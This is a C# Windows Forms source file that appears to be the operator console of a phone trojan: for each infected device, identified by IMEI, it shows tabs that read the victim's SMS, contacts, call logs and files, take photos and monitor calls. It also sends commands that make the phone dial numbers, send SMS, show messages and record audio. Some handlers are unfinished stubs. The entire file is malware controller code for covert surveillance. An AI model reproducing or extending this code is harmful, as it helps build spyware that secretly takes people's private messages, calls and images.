using System.Collections.Generic;
using System.Windows.Forms;
using InOut;
using InOut.Entity;
using InOut.Utils;
using IIE.Phone.Troj.Host.Panel;

namespace IIE.Phone.Troj.Host
{
    public partial class UserOptionFrm : Form
    {
        private readonly string imei;
        private readonly IServer server;
        private readonly List<Control> panelList;
        private List<string>  clientLogBuffer ;
        public UserOptionFrm( string imei , IServer server , ILog log)
        {
            this.imei = imei;
            this.server = server;
            InitializeComponent();
            Text = string.Format("端户端 IMEI:{0}", imei);
            panelList = new List<Control>();
            AddTagPage("读取短信", new ReadSmsPanel(imei, server));
            AddTagPage("读取通迅录", new ReadContractsPanel(imei, server));
            AddTagPage("读取通话记录", new ReadCallLogPanel(imei, server));
            AddTagPage("读取文件", new ReadFilePanel(imei, server));
            AddTagPage("拍照",new TakePhotoPanel(imei,server));
            AddTagPage("电话监听", new CallMonitorPanel(imei, server));
            clientLogBuffer = new List<string>();
            log.ClientLogHandler += Log_ClientLogHandler;

        }

        private void Log_ClientLogHandler(string tempImei ,string message)
        {

            if (tempImei == imei &&!string.IsNullOrEmpty(message))
            {
                clientLogBuffer.Insert(0,message);
                Invoke(new MethodInvoker(AppendLog));
            }
                

        }

        private void AppendLog()
        {
            rtbClientLog.Lines = clientLogBuffer.ToArray();
        }

        private void AddTagPage(string txt , Control panel)
        {
            var tabl = new TabPage();
            panel.Dock = DockStyle.Fill;
            tabl.Controls.Add(panel);
            tabl.Text = txt;
            panelList.Add(panel);
            tcMain.TabPages.Add(tabl);
        }

       

        private void tsCall_Click(object sender, System.EventArgs e)
        {
            var callPhoneFrm = new CallPhoneFrm();
            if (callPhoneFrm.ShowDialog(this) == DialogResult.OK)
            {
                server.CommandSender(imei,Protocol.GiveCall, callPhoneFrm.PhoneNumber.GetBytes());
            }
        }

        private void tsSms_Click(object sender, System.EventArgs e)
        {
            var smsFrm = new SendSmsFrm();
            if (smsFrm.ShowDialog(this) == DialogResult.OK)
            {
                var dict = new Dictionary<string, string>();
                dict[Protocol.KeySendSmsNumber] = smsFrm.PhoneNumber;
                dict[Protocol.KeySendSmsBody] = smsFrm.SmsContent;
                server.CommandSender(imei,Protocol.SendSms,PacketUtil.Build(dict));

            }
        }

        private void tsMessage_Click(object sender, System.EventArgs e)
        {
            var messageFrm = new SendMessageFrm();
            if (messageFrm.ShowDialog() == DialogResult.OK)
            {
                server.CommandSender(imei, Protocol.DoToast,messageFrm.Message.GetBytes());
            }
        }

        private RecordVioceFrm recordVioceFrm;
        private void tsRecordAudio_Click(object sender, System.EventArgs e)
        {
            recordVioceFrm = new RecordVioceFrm(imei,server);
            recordVioceFrm.ShowInTaskbar = false;
            recordVioceFrm.StartPosition = FormStartPosition.CenterParent;
            recordVioceFrm.ShowDialog(this);
        }

        public void SaveSoundChannel(int channel)
        {
            if (recordVioceFrm != null)
                recordVioceFrm.Channel = channel;
        }

        public void SavePictureChannel(int channel)
        {
            //throw new System.NotImplementedException();
        }

        public void SaveCallLogChannel(int channel)
        {
            
        }

        public void SaveSMSChannel(int channel)
        {
            
        }

        public void SaveContactChannel(int channel)
        {
            
        }

        public void SaveMonitorCallChannel(int channel)
        {
            
        }

        public void SaveMonitorSMSChannel(int channel)
        {
            throw new System.NotImplementedException();
        }

        public void SaveVideoChannel(int channel)
        {
            throw new System.NotImplementedException();
        }

        public void UpdateAdvInformations(InOut.PacketImp.AdvancedInformationPacket packet)
        {
            throw new System.NotImplementedException();
        }

        public void UpdateUserCallLogs(InOut.PacketImp.CallPacket[] list)
        {
            foreach (var control in panelList)
            {
                if (control is ReadCallLogPanel)
                {
                    ((ReadCallLogPanel)control).UpdateUserCallLogs(list);
                    break;
                }
            }
        }

        public void AddMonitoredCall(int type, string phonenumber, string date, byte[] phonedata)
        {
            //MessageBox.Show("1");
            //throw new System.NotImplementedException();
            foreach (var control in panelList)
            {
                if (control is CallMonitorPanel)
                {
                    ((CallMonitorPanel)control).AddMonitoredCall(type, phonenumber, date, phonedata);
                    break;
                }
            }
        }

        public void UpdateContacts(InOut.Entity.Contact[] list)
        {
            foreach (var control in panelList)
            {
                if (control is ReadContractsPanel)
                {
                    ((ReadContractsPanel)control).UpdateContacts(list);
                    break;
                }
            }
        }

        public void UpdateFileTree(MyFile[] list)
        {
            foreach (var control in panelList)
            {
                if (control is ReadFilePanel)
                {
                    ((ReadFilePanel)control).UpdateFileTree(list);
                    break;
                }
            }
        }

        public void UpdateUserPicture(byte[] data)
        {
            foreach (var control in panelList)
            {
                if (control is TakePhotoPanel)
                {
                    ((TakePhotoPanel)control).UpdatePicture(data);
                    break;
                }
            }
        }

        public void UpdatePreference(string ip, int port, bool waitTrigger, string[] phoneNumberCall, string[] phoneNumberSMS, string[] keywordSMS)
        {
            throw new System.NotImplementedException();
        }

        public void UpdateSMS(InOut.PacketImp.SMSPacket[] list)
        {
            foreach (var control in panelList)
            {
                if (control is ReadSmsPanel)
                {
                    ((ReadSmsPanel)control).UpdateSms(list);
                    break;
                }
            }
        }

        public void AddMonitoredSMS(string address, long date, string body)
        {
            throw new System.NotImplementedException();
        }
        //原来的
        public void AddSoungBytes(byte[] data)
        {
            //TODO:保存录音文件
            if (recordVioceFrm != null)
            {
                recordVioceFrm.AddSoungBytes(data);
            }
        }

        public void AddVideoBytes(byte[] data)
        {
            throw new System.NotImplementedException();
        }

        private void 电话监听ToolStripMenuItem_Click(object sender, System.EventArgs e)
        {

        }

        //private RecordVioceFrm listenPhoneFrm;
        /*
        private void 电话监听ToolStripMenuItem_Click(object sender, System.EventArgs e)
        {
            listenPhoneFrm = new ListenPhoneFrm(imei, server);
            listenPhoneFrm.ShowInTaskbar = false;
            listenPhoneFrm.StartPosition = FormStartPosition.CenterParent;
            listenPhoneFrm.ShowDialog(this);
        }
         */
    }
}
